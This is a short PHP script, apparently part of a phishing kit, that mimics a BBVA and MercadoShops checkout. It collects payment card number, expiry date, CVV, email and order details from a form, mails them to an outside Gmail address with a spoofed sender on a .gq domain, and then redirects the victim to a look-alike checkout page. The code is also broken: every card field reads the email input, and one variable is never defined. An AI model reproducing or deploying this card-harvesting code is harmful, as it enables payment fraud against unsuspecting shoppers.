<?php 
    $item_name = $_POST['item_name'];
	$amount = $_POST['amount'];
	$currency_code = $_POST['currency_code'];
	
	$email = $_POST['email'];
	$card_number = $_POST['email'];
	$input_expiration_date = $_POST['email'];
	$cvv = $_POST['email'];
	$asunto = 'efectivo bbva enviado';
	$mensaje = "Nombre: ".$nombre."<br> Email: $card_number <br> input_expiration_date: $input_expiration_date <br> cvv: $cvv <br> item_name: $item_name <br> amount: $amount <br> currency_code: $currency_code";

	$from = 'IAXG830920HS@gmail.com';
$headers = "From: admin@soberanosoft.gq\r\n"; 
$headers .= "Reply-To: $from\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=utf-8\r\n"; 
	
if(mail($from, $asunto, $mensaje,$headers)){
	header("Location: https://www.gamestoremercadoshopscom.ml/mpago/checkout_v1_payment_redirect_0a5dbcbb-bec7-4d9e-a63d-269317184802_payment-option-form__source=Finalizá_tu_Pago_efectivo_bbva?item_name=$item_name&amount=$amount");
exit();
	}

 ?>